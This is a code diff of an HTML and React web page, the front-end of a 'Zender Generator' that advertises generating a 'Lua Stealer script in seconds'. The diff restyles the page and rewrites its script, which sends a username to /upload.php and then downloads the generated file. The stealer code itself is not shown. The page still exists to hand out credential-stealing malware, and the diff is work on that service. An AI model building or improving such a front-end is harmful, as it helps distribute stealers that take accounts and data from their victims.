@@ -3,12 +3,24 @@
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Generator</title>
+    <title>Zender Generator</title>
+    <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;700&family=Roboto:wght@300;400&display=swap" rel="stylesheet" />
+    <link rel="icon" href="/assets/images/favicon.jpg" type="image/jpeg" />
+    <!-- Hoặc nếu là JPG -->
+    <!-- <link rel="icon" href="/assets/images/favicon.jpg" type="image/jpeg" /> -->
+    <script src="https://unpkg.com/react@18/umd/react.development.js" crossorigin></script>
+    <script src="https://unpkg.com/react-dom@18/umd/react-dom.development.js" crossorigin></script>
+    <script src="https://unpkg.com/babel-standalone@6/babel.min.js"></script>
     <style>
+      @font-face {
+        font-family: 'Qilka';
+        src: url('/fonts/qilka.otf') format('opentype');
+      }
+
       body {
-        background: #121212;
-        color: white;
-        font-family: Arial, sans-serif;
+        background: linear-gradient(135deg, #1e1e1e, #121212);
+        color: #f5f5f5;
+        font-family: 'Playfair Display', serif;
         text-align: center;
         display: flex;
         flex-direction: column;
@@ -16,131 +28,206 @@
         align-items: center;
         height: 100vh;
         margin: 0;
+        overflow: hidden;
+      }
+
+      .container {
+        max-width: 600px;
+        padding: 20px;
+        text-align: center;
+        border-radius: 15px;
+        background: rgba(255, 255, 255, 0.05);
+        box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
+      }
+
+      @keyframes fadeIn {
+        from {
+          opacity: 0;
+        }
+        to {
+          opacity: 1;
+        }
+      }
+
+      .fade {
+        animation: fadeIn 2s ease-in-out;
+      }
+
+      .title {
+        font-size: 36px;
+        font-weight: bold;
+        margin-bottom: 10px;
+        color: #6a5acd;
+        text-shadow: 0 4px 10px rgba(106, 90, 205, 0.5);
+        font-family: 'Qilka', serif;
+        animation: fadeIn 2s ease-in-out;
+      }
+
+      .subtitle {
+        font-size: 18px;
+        font-family: 'Roboto', sans-serif;
+        margin-bottom: 20px;
+        color: #dcdcdc;
+      }
+
+      .icon {
+        display: none;
       }
 
       .input-box {
-        width: 300px;
+        width: 350px;
         padding: 15px;
-        border-radius: 10px;
-        border: 2px solid #555;
-        background: #222;
-        color: white;
+        border-radius: 15px;
+        border: 2px solid #444;
+        background: rgba(255, 255, 255, 0.1);
+        color: #f5f5f5;
         font-size: 18px;
         text-align: center;
         outline: none;
+        box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+        transition: all 0.3s ease;
       }
 
       .input-box:focus {
-        border-color: #00a86b;
-        background: #333;
+        border-color: #ffd700;
+        background: rgba(255, 255, 255, 0.2);
+        box-shadow: 0 6px 20px rgba(255, 215, 0, 0.5);
       }
 
       .btn {
         margin-top: 20px;
-        padding: 10px 20px;
+        padding: 12px 25px;
         border: none;
-        border-radius: 5px;
-        background: #00a86b;
-        color: white;
-        font-size: 16px;
+        border-radius: 25px;
+        background: linear-gradient(90deg, #6a5acd, #483d8b);
+        color: #f5f5f5;
+        font-size: 18px;
+        font-family: 'Roboto', sans-serif;
+        font-weight: bold;
         cursor: pointer;
+        box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+        transition: all 0.3s ease;
       }
 
       .btn:hover {
-        background: #008f5d;
+        background: linear-gradient(90deg, #483d8b, #6a5acd);
+        box-shadow: 0 6px 20px rgba(72, 61, 139, 0.5);
+        transform: scale(1.05);
       }
 
       .result {
         margin-top: 20px;
         font-size: 16px;
+        font-family: 'Roboto', sans-serif;
       }
 
       .loading {
         font-size: 18px;
-        color: #00a86b;
+        color: #ffd700;
+        font-family: 'Roboto', sans-serif;
       }
 
       .error {
-        color: red;
+        color: #ff4d4d;
+        font-family: 'Roboto', sans-serif;
+      }
+
+      /* Bỏ hiệu ứng wave */
+      .wave-effect {
+        display: none;
+      }
+
+      @keyframes wave-animation {
+        to {
+          transform: scale(4);
+          opacity: 0;
+        }
       }
     </style>
   </head>
   <body>
-    <input
-      type="text"
-      id="username"
-      class="input-box"
-      placeholder="Enter your username"
-    />
-    <button class="btn" id="generate-btn" onclick="uploadToPastebin()">Generate</button>
-    <div class="result" id="result"></div>
+    <div id="root"></div>
+    <script type="text/babel">
+      const App = () => {
+        const [username, setUsername] = React.useState('');
+        const [result, setResult] = React.useState('');
+        const [loading, setLoading] = React.useState(false);
 
-    <script>
-      function uploadToPastebin() {
-        const username = document.getElementById("username").value.trim();
-        if (!username) {
-          alert("Please enter your username!");
-          return;
-        }
+        const uploadToPastebin = () => {
+          if (!username.trim()) {
+            alert('Please enter your username!');
+            return;
+          }
 
-        document.getElementById("result").innerText = "";
-        const loadingMessage = document.createElement("div");
-        loadingMessage.classList.add("loading");
-        loadingMessage.innerText = "Uploading...";
-        document.getElementById("result").appendChild(loadingMessage);
+          setResult('');
+          setLoading(true);
 
-        fetch("/upload.php", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ username }),
-        })
-          .then((response) => {
-            if (response.redirected) {
-              loadingMessage.remove();
-              const successMessage = document.createElement("div");
-              successMessage.innerText = "✅ File created successfully, forwarding in 3 seconds...";
-              document.getElementById("result").appendChild(successMessage);
-
-              setTimeout(() => {
-                window.location.href = response.url;
-
-                const link = document.createElement("a");
-                link.href = response.url;
-                const timestamp = new Date().toISOString().replace(/[-:.]/g, "");
-                link.download = `${timestamp}_${response.url.split('/').pop()}`;
-                document.body.appendChild(link);
-                link.click();
-                document.body.removeChild(link);
-              }, 3000);
-            } else {
-              return response.json();
-            }
+          fetch('/upload.php', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ username }),
           })
-          .then((data) => {
-            if (data && data.error) {
-              loadingMessage.remove();
-              const errorMessage = document.createElement("div");
-              errorMessage.classList.add("error");
-              errorMessage.innerText = "❌ Failed to create file!";
-              document.getElementById("result").appendChild(errorMessage);
-            }
-          })
-          .catch((err) => {
-            console.error(err);
-            loadingMessage.remove();
-            const errorMessage = document.createElement("div");
-            errorMessage.classList.add("error");
-            errorMessage.innerText = "❌ An error occurred!";
-            document.getElementById("result").appendChild(errorMessage);
-          });
-      }
+            .then((response) => {
+              if (response.redirected) {
+                setLoading(false);
+                setResult('✅ File created successfully, forwarding in 3 seconds...');
+                setTimeout(() => {
+                  window.location.href = response.url;
 
-      document.getElementById("username").addEventListener("keypress", function (event) {
-        if (event.key === "Enter") {
-          event.preventDefault();
-          document.getElementById("generate-btn").click();
-        }
-      });
+                  const link = document.createElement('a');
+                  link.href = response.url;
+                  const timestamp = new Date().toISOString().replace(/[-:.]/g, '');
+                  link.download = `${timestamp}_${response.url.split('/').pop()}`;
+                  document.body.appendChild(link);
+                  link.click();
+                  document.body.removeChild(link);
+                }, 3000);
+              } else {
+                return response.json();
+              }
+            })
+            .then((data) => {
+              if (data && data.error) {
+                setLoading(false);
+                setResult('❌ Failed to create file!');
+              }
+            })
+            .catch((err) => {
+              console.error(err);
+              setLoading(false);
+              setResult('❌ An error occurred!');
+            });
+        };
+
+        React.useEffect(() => {
+          // Xóa cơ chế wave effect
+        }, []);
+
+        return (
+          <div className="container">
+            <div className="title fade">Zender Generator</div>
+            <div className="subtitle">Gerenate Your Own Lua Stealer script in seconds</div>
+            <input
+              type="text"
+              className="input-box"
+              placeholder="Enter your username"
+              value={username}
+              onChange={(e) => setUsername(e.target.value)}
+              onKeyPress={(e) => {
+                if (e.key === 'Enter') uploadToPastebin();
+              }}
+            />
+            <button className="btn" onClick={uploadToPastebin}>
+              Generate
+            </button>
+            <div className="result">
+              {loading ? <div className="loading">Uploading...</div> : result}
+            </div>
+          </div>
+        );
+      };
+
+      ReactDOM.render(<App />, document.getElementById('root'));
     </script>
   </body>
 </html>
